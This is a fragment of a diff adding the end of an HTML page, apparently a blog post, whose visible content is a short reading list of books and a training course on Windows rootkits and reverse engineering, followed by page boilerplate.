+<li><a href="https://www.amazon.co.uk/ROOTKIT-ARSENAL-2E-EVASION-CORNERS/dp/144962636X/">The Rootkit Arsenal 2nd Ed</a></li>
+<li><a href="https://www.amazon.co.uk/Rootkits-Subverting-Addison-Wesley-Software-Security/dp/0321294319/">Rootkits: Subverting the Windows Kernel</a></li>
+<li><a href="https://www.amazon.co.uk/Rootkits-Bootkits-Reversing-Malware-Generation/dp/1593277164/">Rootkits and Bootkits Reversing Modern Malware and Next Generation Threats</a></li>
+<li><a href="https://www.amazon.co.uk/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315/">Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools, and Obfuscation</a></li>
+<li><a href="https://www.offensivecon.org/trainings/2020/windows-kernel-rootkits-techniques-and-analysis.html">Windows Kernel Rootkits: Techniques and Analysis</a></li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
